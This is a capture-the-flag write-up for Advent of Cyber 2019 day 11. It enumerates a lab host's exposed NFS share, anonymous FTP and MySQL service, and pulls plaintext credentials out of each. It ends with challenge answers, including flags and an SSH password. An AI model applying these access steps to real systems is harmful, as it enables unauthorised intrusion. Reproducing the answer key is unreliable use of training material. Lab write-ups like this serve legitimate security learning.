# This is the Write Up for day 11 challenge of Advent of Cyber 2K19 CTF.

> Pratyush Prakhar (5#1NC#4N) - 12/12/2019

## Description

McSkidy has been happy with the progress they've been making, but there's still so much to do. One of their main servers has some integral services running, but they can't access these services. Did the Christmas Monster lock them out? 

`This challenge is all about your knowledge service enumeration and pentesting.`

## Solution

1. Let's do service scans --> [All ports scan](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_11/rustscan/all.nmap) and [Main Scan](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_11/rustscan/main.nmap).

2. We find certain interesting services open on the IP. Let's look into them one by one.
    1. _Port 111, 2049_ - **NFS --> Network File System** - a distributed file system protocol that allows a user on a client computer to access files over a network as if they were stored locally on the client's own hard drive. We can locally mount if any open folders/files are exposed or shared to get some information.
    2. _Port 21_ - **FTP --> File Transfer Protocol** - Anonymous login allowed. Can we interesting.
    3. _Port 3306_ - **MySQL** - Maybe some way to access the database (mostly containing important information) appears.

3. NFS
    1. `showmount` found `/opt/files` folder shared with all.
    2. `mounted` the folder locally to enumerate.
    3. Found some useful information in the [creds.txt](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_11/nfs/files/creds.txt) file that might come in handy.

```bash
└─$ ls
files
                                                                                                                                                        
└─$ showmount -e 10.10.82.14                              
Export list for 10.10.82.14:
/opt/files *
                                                                                                                                                          
└─$ sudo mount -t nfs 10.10.82.14:/opt/files ./files -o nolock
[sudo] password for kali: 
                                                                                                                                                          
└─$ cd files 
                                                                                                                                                          
└─$ ls -la
total 8
drwxrwxrwx 2 kali kali   23 Dec 10  2019 .
drwxr-xr-x 3 kali kali 4096 Nov 14 22:01 ..
-rwxrwxrwx 1 kali kali   34 Dec 10  2019 creds.txt
                                                                                                                                                
└─$  cat creds.txt 
the password is securepassword123
                                                                                                                                                          
└─$ cd ..                                                    
                                                                                                                                                          
└─$ sudo umount files 
```

4. FTP
    1. Logged in the ftp with `anonymous` login.
    2. Found interesting files called [file.txt](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_11/ftp/file.txt) and [welcome.msg](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_11/ftp/welcome.msg) in the root directory.
    3. Rest folder seems to be empty.
    4. The files provided us the path to the SQL database.

```bash
└─$ ftp 10.10.82.14                                                                                                              
Connected to 10.10.82.14.
220 (vsFTPd 3.0.2)
Name (10.10.82.14:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||65535|).
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
-rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
226 Directory send OK.
ftp> get file.txt
local: file.txt remote: file.txt
229 Entering Extended Passive Mode (|||65535|).
150 Opening BINARY mode data connection for file.txt (39 bytes).
100% |*********************************************************************************************************************************************************************|    39      865.58 KiB/s    00:00 ETA
226 Transfer complete.
39 bytes received in 00:00 (0.21 KiB/s)
ftp> get uploads
local: uploads remote: uploads
229 Entering Extended Passive Mode (|||65535|).
550 Failed to open file.
ftp> get welcome.msg
local: welcome.msg remote: welcome.msg
229 Entering Extended Passive Mode (|||65535|).
150 Opening BINARY mode data connection for welcome.msg (224 bytes).
100% |*********************************************************************************************************************************************************************|   224        4.61 KiB/s    00:00 ETA
226 Transfer complete.
224 bytes received in 00:00 (1.06 KiB/s)
ftp> cd pub
250 Directory successfully changed.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||65535|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Nov 04  2019 .
drwxr-xr-x    4 0        0              67 Dec 10  2019 ..
226 Directory send OK.
ftp> cd ../uploads
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||65535|).
150 Here comes the directory listing.
226 Transfer done (but failed to open directory).
ftp> 
```

5. MySQL
    1. Get into the remote hosted DB with the creds found.
    2. We enumerate teh available databases. `data` seems odd. Let's look into it. 
    3. On reading the available `USERS` table, we get a set of [credentials](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_11/sql/data/users.txt).

```bash
└─$ mysql -u root -p -h 10.10.82.14
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 5.7.28 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> \h

General information about MariaDB can be found at
http://mariadb.org

List of all client commands:
Note that all text commands must be first on line and end with ';'
?         (\?) Synonym for `help'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
edit      (\e) Edit command with $EDITOR.
ego       (\G) Send command to MariaDB server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to MariaDB server.
help      (\h) Display this help.
nopager   (\n) Disable pager, print to stdout.
notee     (\t) Don't write into outfile.
pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
print     (\p) Print current command.
prompt    (\R) Change your mysql prompt.
quit      (\q) Quit mysql.
rehash    (\#) Rebuild completion hash.
source    (\.) Execute an SQL script file. Takes a file name as an argument.
status    (\s) Get status information from the server.
system    (\!) Execute a system shell command.
tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
use       (\u) Use another database. Takes database name as argument.
charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.
warnings  (\W) Show warnings after every statement.
nowarning (\w) Don't show warnings after every statement.

For server side help, type 'help contents'

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.180 sec)

MySQL [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| USERS          |
+----------------+
1 row in set (0.160 sec)

MySQL [data]> SELECT * FROM USERS;
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | bestpassword |
+-------+--------------+
1 row in set (0.183 sec)
```

## Brownie Points

1. Compromise the web server using Metasploit. What is flag1? - **THM{3ad96bb13ec963a5ca4cb99302b37e12}**.

2. Now you've compromised the web server, get onto the main system. What is Santa's SSH password?- **rudolphrednosedreindeer**.

3. Who is on line 148 of the naughty list? - **Melisa Vanhoose**.

4. Who is on line 52 of the nice list? - **Lindsey Gaffney**


## Extra Treats.

1. Look into the other open services found. Have fun.





